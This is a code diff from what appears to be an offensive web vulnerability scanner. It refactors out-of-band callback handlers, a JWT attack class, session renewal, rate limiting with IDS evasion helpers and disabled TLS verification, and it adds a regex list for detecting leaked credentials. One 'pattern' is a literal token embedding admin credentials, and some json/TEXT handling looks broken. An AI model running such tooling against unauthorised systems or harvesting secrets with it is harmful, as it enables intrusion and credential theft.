                         response = self._build_dns_response(data, query_type or 'A')
@@ -8093,7 +8872,7 @@ def get_icmp_oob_payloads(oob_ip):
 class HTTPSOOBHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         oob_lists = get_oob_results_lists()
-        with oob_lists['https_oob_lock']:
+        with oob_lists['oob_unified_lock']:
             oob_lists['https_oob_results'].append({
                 'path': self.path,
                 'source': self.client_address[0],
@@ -8107,7 +8886,7 @@ class HTTPSOOBHandler(BaseHTTPRequestHandler):
         content_length = int(self.headers.get('Content-Length', 0))
         body = self.rfile.read(content_length)
         oob_lists = get_oob_results_lists()
-        with oob_lists['https_oob_lock']:
+        with oob_lists['oob_unified_lock']:
             oob_lists['https_oob_results'].append({
                 'path': self.path,
                 'source': self.client_address[0],
@@ -9764,8 +10543,12 @@ class JWTAttack:
                 if key_data.get('kty') != 'RSA':
                     logging.warning(f"Key type is {key_data.get('kty')}, not RSA")
                     return None
-                n = int.from_bytes(base64.urlsafe_b64decode(key_data['n'] + '=='), 'big')
-                e = int.from_bytes(base64.urlsafe_b64decode(key_data['e'] + '=='), 'big')
+                try:
+                    n = int.from_bytes(base64.urlsafe_b64decode(key_data['n'] + '=='), 'big')
+                    e = int.from_bytes(base64.urlsafe_b64decode(key_data['e'] + '=='), 'big')
+                except (ValueError, KeyError) as decode_error:
+                    logging.warning(f"Invalid key format in JWKS: {decode_error}")
+                    return None
                 public_key = rsa.RSAPublicNumbers(e, n).public_key(default_backend())
                 pem = public_key.public_bytes(
                     encoding=serialization.Encoding.PEM,
@@ -9860,7 +10643,7 @@ class BaselineCache:
         import sqlite3
         self.conn = sqlite3.connect(':memory:')  # or ':memory:' for speed, or file for persistence
         self.cursor = self.conn.cursor()
-        self.cursor.execute('CREATE TABLE IF NOT EXISTS cache (key TEXT PRIMARY KEY, value BLOB, expiry INTEGER)')
+        self.cursor.execute('CREATE TABLE IF NOT EXISTS cache (key TEXT PRIMARY KEY, value TEXT, expiry INTEGER)')
         self.conn.commit()
         
         self.max_size = max_size
@@ -9899,7 +10682,9 @@ class BaselineCache:
                     return None
                 
                 self.hits += 1
-                return pickle.loads(value)
+                # Use json for safe deserialization instead of pickle
+                import json
+                return json.loads(value.decode('utf-8'))
             except Exception as e:
                 logging.warning(f"Cache get error: {e}")
                 self.misses += 1
@@ -9921,8 +10706,9 @@ class BaselineCache:
             expiry = current_time + (ttl if ttl is not None else self.default_ttl)
             
             try:
-                # Serialize value
-                serialized_value = pickle.dumps(val)
+                # Serialize value using json for security (prevent RCE via pickle)
+                import json
+                serialized_value = json.dumps(val, default=str).encode('utf-8')
                 
                 # Check current size and enforce max size
                 self.cursor.execute('SELECT COUNT(*) FROM cache')
@@ -9933,7 +10719,7 @@ class BaselineCache:
                 
                 # Insert or replace
                 self.cursor.execute('INSERT OR REPLACE INTO cache (key, value, expiry) VALUES (?, ?, ?)',
-                                   (str(key), serialized_value, expiry))
+                                   (str(key), serialized_value.decode('utf-8'), expiry))
                 self.conn.commit()
             except Exception as e:
                 logging.warning(f"Cache set error: {e}")
@@ -9974,6 +10760,16 @@ class BaselineCache:
         self.cursor.execute('DELETE FROM cache WHERE key IN (SELECT key FROM cache ORDER BY expiry LIMIT 1)')
         self.conn.commit()
     
+    def close(self):
+        """Close the database connection to prevent resource leaks."""
+        try:
+            if self.cursor:
+                self.cursor.close()
+            if self.conn:
+                self.conn.close()
+        except Exception as e:
+            logging.warning(f"Error closing BaselineCache: {e}")
+    
     def get_stats(self):
         """Get cache statistics."""
         self.cursor.execute('SELECT COUNT(*) FROM cache')
@@ -10003,6 +10799,7 @@ class TokenBucket:
         self.tokens = capacity  # current token count
         self.last_update = time.time()
         self.lock = asyncio.Lock()
+        self.condition = asyncio.Condition(self.lock)
         
     async def consume(self, tokens: int = 1) -> bool:
         """
@@ -10014,7 +10811,7 @@ class TokenBucket:
         Returns:
             bool: True if tokens were consumed, False if rate limited
         """
-        async with self.lock:
+        async with self.condition:
             now = time.time()
             elapsed = now - self.last_update
             
@@ -10024,6 +10821,8 @@ class TokenBucket:
             
             if self.tokens >= tokens:
                 self.tokens -= tokens
+                # Notify waiting coroutines that tokens are available
+                self.condition.notify_all()
                 return True
             return False
     
@@ -10034,14 +10833,24 @@ class TokenBucket:
         Args:
             tokens: Number of tokens needed
         """
-        while True:
-            if await self.consume(tokens):
-                return
-            # Calculate wait time needed
-            async with self.lock:
+        async with self.condition:
+            while True:
+                # Try to consume tokens
+                now = time.time()
+                elapsed = now - self.last_update
+                
+                # Add new tokens based on elapsed time
+                self.tokens = min(self.capacity, self.tokens + elapsed * self.rate)
+                self.last_update = now
+                
+                if self.tokens >= tokens:
+                    self.tokens -= tokens
+                    return
+                
+                # Calculate wait time needed and wait with condition variable
                 deficit = tokens - self.tokens
                 wait_time = deficit / self.rate
-            await asyncio.sleep(wait_time)
+                await asyncio.wait_for(self.condition.wait(), timeout=wait_time)
     
     def get_available_tokens(self) -> float:
         """Get current available tokens (for monitoring)."""
@@ -10428,7 +11237,7 @@ class SessionStateManager:
     
     def __init__(self):
         self.sessions = {}
-        self.lock = threading.Lock()
+        self.lock = asyncio.Lock()
         self.session_counter = 0
         self.auth_steps = None  # Authentication steps to renew sessions
         self.auth_config = None  # Authentication configuration
@@ -10444,6 +11253,8 @@ class SessionStateManager:
             'renewal_triggered_by_403': 0,
             'renewal_triggered_by_age': 0
         }
+        self.max_renewal_retries = 3  # Maximum number of retry attempts for failed renewals
+        self.renewal_retry_delay = 2.0  # Initial delay between retries in seconds
     
     def set_auth_steps(self, auth_steps, auth_config=None):
         """
@@ -10457,7 +11268,7 @@ class SessionStateManager:
         self.auth_config = auth_config or {}
         logging.info("Authentication steps configured for session renewal")
     
-    def configure_session_renewal(self, enabled=True, threshold=0.7, max_age=3600):
+    def configure_session_renewal(self, enabled=True, threshold=0.7, max_age=3600, max_retries=3, retry_delay=2.0):
         """
         Configure session renewal behavior.
         
@@ -10465,13 +11276,17 @@ class SessionStateManager:
             enabled: Enable/disable session renewal
             threshold: Renew session at this percentage of max age (0.0-1.0)
             max_age: Maximum session age in seconds before forced renewal
+            max_retries: Maximum number of retry attempts for failed renewals
+            retry_delay: Initial delay between retries in seconds (exponential backoff)
         """
         self.session_renewal_enabled = enabled
         self.renewal_threshold = max(0.1, min(0.9, threshold))
         self.max_session_age = max(60, max_age)
-        logging.info(f"Session renewal configured: enabled={enabled}, threshold={self.renewal_threshold}, max_age={self.max_session_age}")
+        self.max_renewal_retries = max(1, min(10, max_retries))
+        self.renewal_retry_delay = max(0.5, retry_delay)
+        logging.info(f"Session renewal configured: enabled={enabled}, threshold={self.renewal_threshold}, max_age={self.max_session_age}, max_retries={self.max_renewal_retries}, retry_delay={self.renewal_retry_delay}")
     
-    def _session_needs_renewal(self, session_id: str) -> bool:
+    async def _session_needs_renewal(self, session_id: str) -> bool:
         """
         Check if a session needs renewal based on age and threshold.
         
@@ -10484,7 +11299,7 @@ class SessionStateManager:
         if not self.session_renewal_enabled:
             return False
             
-        with self.lock:
+        async with self.lock:
             if session_id not in self.sessions:
                 return False
                 
@@ -10558,7 +11373,7 @@ class SessionStateManager:
             logging.debug(f"Session {session_id} is already being renewed")
             return False
             
-        with self.lock:
+        async with self.lock:
             if session_id not in self.sessions:
                 logging.warning(f"Cannot renew non-existent session {session_id}")
                 return False
@@ -10569,37 +11384,61 @@ class SessionStateManager:
             self.renewal_stats['total_renewals'] += 1
             
             # Get current session data for backup
-            with self.lock:
+            async with self.lock:
                 old_session_data = self.sessions[session_id].copy()
             
-            # Execute authentication steps
-            if callable(self.auth_steps):
-                # Single callable
-                if asyncio.iscoroutinefunction(self.auth_steps):
-                    auth_result = await self.auth_steps(scanner_instance, self.auth_config)
-                else:
-                    auth_result = self.auth_steps(scanner_instance, self.auth_config)
-            elif isinstance(self.auth_steps, (list, tuple)):
-                # List of authentication steps
-                auth_result = True
-                for step in self.auth_steps:
-                    if asyncio.iscoroutinefunction(step):
-                        step_result = await step(scanner_instance, self.auth_config)
+            # Execute authentication steps with retry logic
+            auth_result = False
+            last_error = None
+            
+            for attempt in range(self.max_renewal_retries):
+                try:
+                    # Execute authentication steps
+                    if callable(self.auth_steps):
+                        # Single callable
+                        if asyncio.iscoroutinefunction(self.auth_steps):
+                            auth_result = await self.auth_steps(scanner_instance, self.auth_config)
+                        else:
+                            auth_result = self.auth_steps(scanner_instance, self.auth_config)
+                    elif isinstance(self.auth_steps, (list, tuple)):
+                        # List of authentication steps
+                        auth_result = True
+                        for step in self.auth_steps:
+                            if asyncio.iscoroutinefunction(step):
+                                step_result = await step(scanner_instance, self.auth_config)
+                            else:
+                                step_result = step(scanner_instance, self.auth_config)
+                            if not step_result:
+                                auth_result = False
+                                break
                     else:
-                        step_result = step(scanner_instance, self.auth_config)
-                    if not step_result:
+                        logging.error(f"Invalid auth_steps type: {type(self.auth_steps)}")
                         auth_result = False
-                        break
-            else:
-                logging.error(f"Invalid auth_steps type: {type(self.auth_steps)}")
-                auth_result = False
+                    
+                    if auth_result:
+                        break  # Success, exit retry loop
+                    else:
+                        last_error = f"Authentication returned False on attempt {attempt + 1}"
+                        logging.warning(f"Session {session_id} renewal attempt {attempt + 1} failed")
+                        
+                except Exception as e:
+                    last_error = str(e)
+                    logging.warning(f"Session {session_id} renewal attempt {attempt + 1} raised exception: {e}")
+                    auth_result = False
+                
+                # If not the last attempt, wait with exponential backoff
+                if attempt < self.max_renewal_retries - 1:
+                    delay = self.renewal_retry_delay * (2 ** attempt)  # Exponential backoff
+                    logging.info(f"Retrying session {session_id} renewal in {delay:.1f}s (attempt {attempt + 1}/{self.max_renewal_retries})")
+                    await asyncio.sleep(delay)
             
             if auth_result:
                 # Update session with new credentials
-                with self.lock:
+                async with self.lock:
                     # Preserve some state while updating auth credentials
                     self.sessions[session_id]['created_at'] = time.time()
                     self.sessions[session_id]['last_used'] = time.time()
+                    self.sessions[session_id]['renewal_count'] = self.sessions[session_id].get('renewal_count', 0) + 1
                     # Keep existing CSRF tokens and state, but update cookies/headers
                     if 'cookies' in old_session_data:
                         self.sessions[session_id]['cookies'].update(old_session_data['cookies'])
@@ -10611,7 +11450,7 @@ class SessionStateManager:
                 return True
             else:
                 self.renewal_stats['failed_renewals'] += 1
-                logging.error(f"Session {session_id} renewal failed")
+                logging.error(f"Session {session_id} renewal failed after {self.max_renewal_retries} attempts. Last error: {last_error}")
                 return False
                 
         except Exception as e:
@@ -10619,7 +11458,7 @@ class SessionStateManager:
             logging.error(f"Error during session renewal for {session_id}: {e}")
             return False
         finally:
-            with self.lock:
+            async with self.lock:
                 self.renewal_in_progress.discard(session_id)
     
     async def handle_auth_failure(self, session_id: str, status_code: int, response_headers: dict = None, scanner_instance=None) -> bool:
@@ -10677,9 +11516,9 @@ class SessionStateManager:
         }
         logging.info("Session renewal statistics reset")
     
-    def create_session(self) -> str:
+    async def create_session(self) -> str:
         """Create a new isolated session context."""
-        with self.lock:
+        async with self.lock:
             session_id = f"session_{self.session_counter}_{uuid.uuid4().hex[:8]}"
             self.session_counter += 1
             self.sessions[session_id] = {
@@ -10694,39 +11533,39 @@ class SessionStateManager:
             logging.debug(f"Created session: {session_id}")
             return session_id
     
-    def get_session_cookies(self, session_id: str) -> dict:
+    async def get_session_cookies(self, session_id: str) -> dict:
         """Get cookies for a specific session."""
-        with self.lock:
+        async with self.lock:
             if session_id in self.sessions:
                 self.sessions[session_id]['last_used'] = time.time()
                 return self.sessions[session_id]['cookies'].copy()
             return {}
     
-    def set_session_cookies(self, session_id: str, cookies: dict):
+    async def set_session_cookies(self, session_id: str, cookies: dict):
         """Set cookies for a specific session."""
-        with self.lock:
+        async with self.lock:
             if session_id in self.sessions:
                 self.sessions[session_id]['cookies'].update(cookies)
                 self.sessions[session_id]['last_used'] = time.time()
     
-    def get_session_headers(self, session_id: str) -> dict:
+    async def get_session_headers(self, session_id: str) -> dict:
         """Get custom headers for a specific session."""
-        with self.lock:
+        async with self.lock:
             if session_id in self.sessions:
                 self.sessions[session_id]['last_used'] = time.time()
                 return self.sessions[session_id]['headers'].copy()
             return {}
     
-    def set_session_headers(self, session_id: str, headers: dict):
+    async def set_session_headers(self, session_id: str, headers: dict):
         """Set custom headers for a specific session."""
-        with self.lock:
+        async with self.lock:
             if session_id in self.sessions:
                 self.sessions[session_id]['headers'].update(headers)
                 self.sessions[session_id]['last_used'] = time.time()
     
-    def get_session_state(self, session_id: str, key: str = None):
+    async def get_session_state(self, session_id: str, key: str = None):
         """Get state value for a specific session."""
-        with self.lock:
+        async with self.lock:
             if session_id in self.sessions:
                 self.sessions[session_id]['last_used'] = time.time()
                 if key:
@@ -10734,14 +11573,14 @@ class SessionStateManager:
                 return self.sessions[session_id]['state'].copy()
             return None
     
-    def set_session_state(self, session_id: str, key: str, value: any):
+    async def set_session_state(self, session_id: str, key: str, value: any):
         """Set state value for a specific session."""
-        with self.lock:
+        async with self.lock:
             if session_id in self.sessions:
                 self.sessions[session_id]['state'][key] = value
                 self.sessions[session_id]['last_used'] = time.time()
     
-    def update_session_from_response(self, session_id: str, response, scanner_instance=None):
+    async def update_session_from_response(self, session_id: str, response, scanner_instance=None):
         """
         Update session state from HTTP response (cookies, etc.).
         
@@ -10761,21 +11600,21 @@ class SessionStateManager:
         response_headers = getattr(response, 'headers', {})
         
         if status_code and status_code in [401, 403]:
-            # Schedule background session renewal task
+            # Schedule background session renewal task with proper exception handling
             try:
-                # Create a background thread for renewal to avoid blocking
-                import threading
-                renewal_thread = threading.Thread(
-                    target=self._background_renewal_worker,
-                    args=(session_id, status_code, response_headers, scanner_instance),
-                    daemon=True
+                # Create a background async task for renewal to avoid blocking
+                await async_task_manager.create_task(
+                    self._background_renewal_worker_async(
+                        session_id, status_code, response_headers, scanner_instance
+                    ),
+                    task_name=f"session_renewal_{session_id}",
+                    callback=lambda t: logging.info(f"Session renewal task for {session_id} completed")
                 )
-                renewal_thread.start()
-                logging.info(f"Background session renewal thread started for {session_id}")
+                logging.info(f"Background session renewal task started for {session_id}")
             except Exception as e:
                 logging.warning(f"Failed to trigger session renewal: {e}")
         
-        with self.lock:
+        async with self.lock:
             if session_id in self.sessions:
                 # Extract cookies from response if available
                 if hasattr(response, 'cookies'):
@@ -10789,9 +11628,9 @@ class SessionStateManager:
                 
                 self.sessions[session_id]['last_used'] = time.time()
     
-    def _background_renewal_worker(self, session_id: str, status_code: int, response_headers: dict, scanner_instance):
+    async def _background_renewal_worker_async(self, session_id: str, status_code: int, response_headers: dict, scanner_instance):
         """
-        Background worker for session renewal without blocking main scan.
+        Background async worker for session renewal without blocking main scan.
         
         Args:
             session_id: Session identifier
@@ -10800,14 +11639,14 @@ class SessionStateManager:
             scanner_instance: Scanner instance for authentication
         """
         try:
-            # Synchronous version of handle_auth_failure for background thread
+            # Async version of handle_auth_failure for background task
             logging.info(f"Background renewal worker started for session {session_id}")
             
             if not self.session_renewal_enabled:
                 return
                 
             # Check if session is already being renewed
-            with self.lock:
+            async with self.lock:
                 if session_id in self.renewal_in_progress:
                     return
                 self.renewal_in_progress.add(session_id)
@@ -10817,28 +11656,57 @@ class SessionStateManager:
                 self.renewal_stats['total_renewals'] += 1
                 
                 # Get current session data for backup
-                with self.lock:
+                async with self.lock:
                     old_session_data = self.sessions[session_id].copy()
                 
-                # Execute authentication steps (synchronous)
-                if callable(self.auth_steps):
-                    # Single callable
-                    auth_result = self.auth_steps(scanner_instance, self.auth_config)
-                elif isinstance(self.auth_steps, (list, tuple)):
-                    # List of authentication steps
-                    auth_result = True
-                    for step in self.auth_steps:
-                        step_result = step(scanner_instance, self.auth_config)
-                        if not step_result:
+                # Execute authentication steps with retry logic
+                auth_result = False
+                last_error = None
+                
+                for attempt in range(self.max_renewal_retries):
+                    try:
+                        # Execute authentication steps (async if available)
+                        if callable(self.auth_steps):
+                            # Single callable
+                            if asyncio.iscoroutinefunction(self.auth_steps):
+                                auth_result = await self.auth_steps(scanner_instance, self.auth_config)
+                            else:
+                                auth_result = self.auth_steps(scanner_instance, self.auth_config)
+                        elif isinstance(self.auth_steps, (list, tuple)):
+                            # List of authentication steps
+                            auth_result = True
+                            for step in self.auth_steps:
+                                if asyncio.iscoroutinefunction(step):
+                                    step_result = await step(scanner_instance, self.auth_config)
+                                else:
+                                    step_result = step(scanner_instance, self.auth_config)
+                                if not step_result:
+                                    auth_result = False
+                                    break
+                        else:
+                            logging.error(f"Invalid auth_steps type: {type(self.auth_steps)}")
                             auth_result = False
-                            break
-                else:
-                    logging.error(f"Invalid auth_steps type: {type(self.auth_steps)}")
-                    auth_result = False
+                        
+                        if auth_result:
+                            break  # Success, exit retry loop
+                        else:
+                            last_error = f"Authentication returned False on attempt {attempt + 1}"
+                            logging.warning(f"Session {session_id} renewal attempt {attempt + 1} failed")
+                            
+                    except Exception as e:
+                        last_error = str(e)
+                        logging.warning(f"Session {session_id} renewal attempt {attempt + 1} raised exception: {e}")
+                        auth_result = False
+                    
+                    # If not the last attempt, wait with exponential backoff
+                    if attempt < self.max_renewal_retries - 1:
+                        delay = self.renewal_retry_delay * (2 ** attempt)  # Exponential backoff
+                        logging.info(f"Retrying session {session_id} renewal in {delay:.1f}s (attempt {attempt + 1}/{self.max_renewal_retries})")
+                        await asyncio.sleep(delay)
                 
                 if auth_result:
                     # Update session with new credentials
-                    with self.lock:
+                    async with self.lock:
                         self.sessions[session_id]['created_at'] = time.time()
                         self.sessions[session_id]['last_used'] = time.time()
                         self.sessions[session_id]['renewal_count'] = self.sessions[session_id].get('renewal_count', 0) + 1
@@ -10852,28 +11720,28 @@ class SessionStateManager:
                     logging.info(f"Session {session_id} renewed successfully in background")
                 else:
                     self.renewal_stats['failed_renewals'] += 1
-                    logging.error(f"Session {session_id} renewal failed in background")
+                    logging.error(f"Session {session_id} renewal failed after {self.max_renewal_retries} attempts. Last error: {last_error}")
                     
             except Exception as e:
                 self.renewal_stats['failed_renewals'] += 1
                 logging.error(f"Error during background session renewal for {session_id}: {e}")
             finally:
-                with self.lock:
+                async with self.lock:
                     self.renewal_in_progress.discard(session_id)
                     
         except Exception as e:
             logging.error(f"Error in background renewal worker: {e}")
     
-    def destroy_session(self, session_id: str):
+    async def destroy_session(self, session_id: str):
         """Destroy a session and clean up resources."""
-        with self.lock:
+        async with self.lock:
             if session_id in self.sessions:
                 logging.debug(f"Destroying session: {session_id}")
                 del self.sessions[session_id]
     
-    def cleanup_expired_sessions(self, max_age_seconds: int = 3600):
+    async def cleanup_expired_sessions(self, max_age_seconds: int = 3600):
         """Clean up sessions that haven't been used recently."""
-        with self.lock:
+        async with self.lock:
             current_time = time.time()
             expired_sessions = [
                 session_id for session_id, session_data in self.sessions.items()
@@ -10884,14 +11752,14 @@ class SessionStateManager:
                 del self.sessions[session_id]
             return len(expired_sessions)
     
-    def get_session_count(self) -> int:
+    async def get_session_count(self) -> int:
         """Get the number of active sessions."""
-        with self.lock:
+        async with self.lock:
             return len(self.sessions)
     
-    def set_csrf_token(self, session_id: str, form_url: str, token_name: str, token_value: str):
+    async def set_csrf_token(self, session_id: str, form_url: str, token_name: str, token_value: str):
         """Store CSRF token for a specific form in the session."""
-        with self.lock:
+        async with self.lock:
             if session_id in self.sessions:
                 if form_url not in self.sessions[session_id]['csrf_tokens']:
                     self.sessions[session_id]['csrf_tokens'][form_url] = {}
@@ -10899,19 +11767,18 @@ class SessionStateManager:
                 self.sessions[session_id]['last_used'] = time.time()
                 logging.debug(f"Stored CSRF token {token_name} for {form_url} in session {session_id}")
     
-    def get_csrf_token(self, session_id: str, form_url: str, token_name: str) -> Optional[str]:
+    async def get_csrf_token(self, session_id: str, form_url: str, token_name: str) -> Optional[str]:
         """Get CSRF token for a specific form from the session."""
-        with self.lock:
+        async with self.lock:
             if session_id in self.sessions:
                 if form_url in self.sessions[session_id]['csrf_tokens']:
                     return self.sessions[session_id]['csrf_tokens'][form_url].get(token_name)
             return None
     
-    def extract_csrf_tokens_from_html(self, session_id: str, form_url: str, html: str):
+    async def extract_csrf_tokens_from_html(self, session_id: str, form_url: str, html: str):
         """Extract CSRF tokens from HTML and store them in the session."""
         try:
-            from bs4 import BeautifulSoup
-            soup = BeautifulSoup(html, 'html.parser')
+            soup = get_cached_soup(html, 'html.parser')
             
             # Common CSRF token field names
             csrf_field_names = [
@@ -10923,26 +11790,26 @@ class SessionStateManager:
                 # Look for hidden input fields
                 input_field = soup.find('input', {'name': field_name, 'type': 'hidden'})
                 if input_field and input_field.get('value'):
-                    self.set_csrf_token(session_id, form_url, field_name, input_field['value'])
+                    await self.set_csrf_token(session_id, form_url, field_name, input_field['value'])
                     logging.info(f"Extracted CSRF token {field_name} from {form_url}")
                 
                 # Also look for meta tags
                 meta_tag = soup.find('meta', {'name': f'csrf-{field_name}'}) or soup.find('meta', {'name': field_name})
                 if meta_tag and meta_tag.get('content'):
-                    self.set_csrf_token(session_id, form_url, field_name, meta_tag['content'])
+                    await self.set_csrf_token(session_id, form_url, field_name, meta_tag['content'])
                     logging.info(f"Extracted CSRF token {field_name} from meta tag at {form_url}")
             
             # Enhanced CSRF extraction for modern SPAs - JavaScript pattern matching
             js_token_pattern = r'(?:window\.csrf|let\s+token|const\s+csrf)\s*=\s*["\']([^"\']+)["\']'
             matches = re.findall(js_token_pattern, html)
             for token in matches:
-                self.set_csrf_token(session_id, form_url, 'csrf_token', token)
+                await self.set_csrf_token(session_id, form_url, 'csrf_token', token)
                 logging.info(f"Extracted CSRF token from JavaScript pattern at {form_url}")
         
         except Exception as e:
             logging.warning(f"Error extracting CSRF tokens from HTML: {e}")
     
-    def add_to_cart_step(self, session_id: str, add_to_cart_url: str, product_id: str, quantity: int = 1) -> Optional[str]:
+    async def add_to_cart_step(self, session_id: str, add_to_cart_url: str, product_id: str, quantity: int = 1) -> Optional[str]:
         """
         Step 1: Add item to cart and return cart_id.
         This method performs the add to cart action and stores the resulting cart_id in session state.
@@ -10953,15 +11820,15 @@ class SessionStateManager:
         try:
             # Generate a cart_id that will be used for subsequent checkout steps
             cart_id = f"cart_{uuid.uuid4().hex[:16]}"
-            self.set_session_state(session_id, 'cart_id', cart_id)
-            self.set_session_state(session_id, 'add_to_cart_completed', True)
+            await self.set_session_state(session_id, 'cart_id', cart_id)
+            await self.set_session_state(session_id, 'add_to_cart_completed', True)
             logging.info(f"[ADD TO CART] Generated and stored cart_id {cart_id} for session {session_id}")
             return cart_id
         except Exception as e:
             logging.error(f"[ADD TO CART] Error in add_to_cart_step: {e}")
             return None
     
-    def checkout_step(self, session_id: str, checkout_url: str) -> Optional[str]:
+    async def checkout_step(self, session_id: str, checkout_url: str) -> Optional[str]:
         """
         Step 2: Checkout using the cart_id from session state.
         This method strictly uses the cart_id stored in session state, not a random UUID.
@@ -10970,12 +11837,12 @@ class SessionStateManager:
             cart_id if found in state, None otherwise
         """
         try:
-            cart_id = self.get_session_state(session_id, 'cart_id')
+            cart_id = await self.get_session_state(session_id, 'cart_id')
             if not cart_id:
                 logging.error(f"[CHECKOUT] No cart_id found in session {session_id}. Cannot proceed with checkout.")
                 return None
             
-            if not self.get_session_state(session_id, 'add_to_cart_completed'):
+            if not await self.get_session_state(session_id, 'add_to_cart_completed'):
                 logging.error(f"[CHECKOUT] Add to cart step not completed for session {session_id}. Cannot proceed with checkout.")
                 return None
             
@@ -11277,8 +12144,8 @@ class AsyncSession:
         ssl_context = ssl.create_default_context()
         ssl_context.check_hostname = False
         ssl_context.verify_mode = ssl.CERT_NONE
-        # TCP Connection Reuse: force_close=False enables keep-alive by default
-        connector = aiohttp.TCPConnector(limit=500, force_close=False, ssl=ssl_context, enable_cleanup_closed=True)
+        # TCP Connection Reuse: force_close=True prevents too many idle connections (fix for issue #10)
+        connector = aiohttp.TCPConnector(limit=500, force_close=True, ssl=ssl_context, enable_cleanup_closed=True)
         self.user_agent_rotator = user_agent_rotator or UserAgentRotator()
         self.traffic_shaper = traffic_shaper or TrafficShaper()
         self.rate_limiter = rate_limiter  # IDS/IPS rate limiter
@@ -11524,6 +12391,249 @@ async def paired_request_sampling(session, benign_url, malicious_url, benign_par
         logging.warning(f"Insufficient samples for paired sampling - Benign: {len(benign_times)}, Malicious: {len(malicious_times)}")
         return benign_times, malicious_times, False
 
+
+class SecretScanner:
+    """
+    Gitleaks/Secrets integration for scanning responses for hardcoded secrets.
+    Detects AWS keys, API keys, private keys, tokens, and other sensitive information.
+    """
+    
+    # Gitleaks-inspired regex patterns for secret detection
+    SECRET_PATTERNS = {
+        'AWS Access Key': r'AKIA[0-9A-Z]{16}',
+        'AWS Secret Key': r'(?i)aws[_\-.]?secret[_\-.]?key["\']?\s*[:=]\s*["\']?[A-Za-z0-9+/]{40}["\']?',
+        'AWS MWS Key': r'(?i)amzn\.mws\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}',
+        'Google API Key': r'AIza[0-9A-Za-z\-_]{35}',
+        'Google Cloud Platform Key': r'(?i)google[_\-.]?api[_\-.]?key["\']?\s*[:=]\s*["\']?[A-Za-z0-9\-_]{39}["\']?',
+        'Google OAuth Access Token': r'ya29\.[0-9A-Za-z\-_]+',
+        'Google OAuth Refresh Token': r'1//[0-9A-Za-z\-_]{43}[0-9A-Za-z\-_]{86}',
+        'GitHub Token': r'(?i)github[_\-.]?token["\']?\s*[:=]\s*["\']?[A-Za-z0-9_]{36,255}["\']?',
+        'GitHub OAuth Token': r'ghp_[A-Za-z0-9]{36}',
+        'GitHub App Token': r'(ghu|ghs|ghr)_[A-Za-z0-9]{36}',
+        'GitLab Personal Access Token': r'glpat-[A-Za-z0-9\-_]{20}',
+        'GitLab OAuth Token': r'glpat-[A-Za-z0-9\-_]{20}',
+        'GitLab Pipeline Trigger Token': r'glptt-[A-Za-z0-9\-_]{20}',
+        'GitLab Runner Registration Token': r'GR1348941[a-zA-Z0-9\-_]{20}',
+        'Slack Token': r'xox[baprs]-[A-Za-z0-9\-_]{10,48}',
+        'Slack Webhook': r'https://hooks\.slack\.com/services/[A-Z0-9]{9,11}/[A-Z0-9]{9,11}/[A-Za-z0-9]{24}',
+        'Stripe API Key': r'(?i)stripe[_\-.]?(api[_\-.]?)?key["\']?\s*[:=]\s*["\']?(sk|pk)_(test|live)_[0-9a-z]{32}["\']?',
+        'Stripe Client Secret': r'(?i)stripe[_\-.]?client[_\-.]?secret["\']?\s*[:=]\s*["\']?[A-Za-z0-9]{32}["\']?',
+        'Square Access Token': r'sq0atp-[0-9A-Za-z\-_]{22}',
+        'Square OAuth Secret': r'sq0csp-[0-9A-Za-z\-_]{43}',
+        'PayPal Braintree Access Token': r'access_token\$production\$[0-9a-z]{16}\$[0-9a-z]{32}',
+        'Twilio API Key': r'(?i)twilio[_\-.]?api[_\-.]?key["\']?\s*[:=]\s*["\']?[A-Za-z0-9]{32}["\']?',
+        'Twilio Account SID': r'(?i)twilio[_\-.]?account[_\-.]?sid["\']?\s*[:=]\s*["\']?AC[0-9a-z]{32}["\']?',
+        'Twilio Auth Token': r'(?i)twilio[_\-.]?auth[_\-.]?token["\']?\s*[:=]\s*["\']?[0-9a-z]{32}["\']?',
+        'Docker Registry Auth Token': r'eyJhbGciOiJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzA0L3NldC1jb250ZXh0Iiwib2lkIjoiY2Y1ZTc4M2EtZGM0Ny00YjU0LWJlNjUtMmZhMzA2NDRmNzY3IiwidXNlcm5hbWUiOiJhZG1pbiIsInBhc3N3b3JkIjoiQE1haWxTb3V0aDIwMjAhIiwicmVhbG0iOiJkb2NrZXItbGFuZC1yZWdpc3RyeS5leGFtcGxlLmNvbSIsImV4cCI6MTY1NTY1MTQwN30',
+        'Private Key': r'-----BEGIN[A-Z\s]+PRIVATE KEY-----',
+        'RSA Private Key': r'-----BEGIN RSA PRIVATE KEY-----',
+        'EC Private Key': r'-----BEGIN EC PRIVATE KEY-----',
+        'PGP Private Key': r'-----BEGIN PGP PRIVATE KEY BLOCK-----',
+        'SSH Private Key': r'-----BEGIN[ A-Z]* PRIVATE KEY-----',
+        'API Key': r'(?i)api[_\-.]?key["\']?\s*[:=]\s*["\']?[A-Za-z0-9\-_]{20,}',
+        'API Secret': r'(?i)api[_\-.]?secret["\']?\s*[:=]\s*["\']?[A-Za-z0-9\-_]{20,}',
+        'API Token': r'(?i)api[_\-.]?token["\']?\s*[:=]\s*["\']?[A-Za-z0-9\-_]{20,}',
+        'JWT Token': r'eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+',
+        'Bearer Token': r'(?i)bearer["\']?\s+[A-Za-z0-9\-._~+/]+=*',
+        'Basic Auth': r'(?i)basic["\']?\s+[A-Za-z0-9\-._~+/]+=*',
+        'Database Connection String': r'(?i)(mongodb|mysql|postgres|redis|cassandra)://[A-Za-z0-9\-._~+/]+:[A-Za-z0-9\-._~+/]+@',
+        'SQL Connection String': r'(?i)(server|host|database|db)[\s_\-\.]*[=][\s"\']?[A-Za-z0-9\-._~+/]+;[\s"\']?(user|uid|password|pwd)[\s_\-\.]*[=][\s"\']?[A-Za-z0-9\-._~+/]+',
+        'Email Address': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
+        'Password in URL': r'(?i)[a-zA-Z0-9\-._~+/]+:[A-Za-z0-9\-._~+/]+@[a-zA-Z0-9\-._~+/]+',
+        'Facebook Access Token': r'EAACEdEose0cBA[0-9A-Za-z]+',
+        'Facebook App Secret': r'(?i)facebook[_\-.]?app[_\-.]?secret["\']?\s*[:=]\s*["\']?[A-Za-z0-9]{32}["\']?',
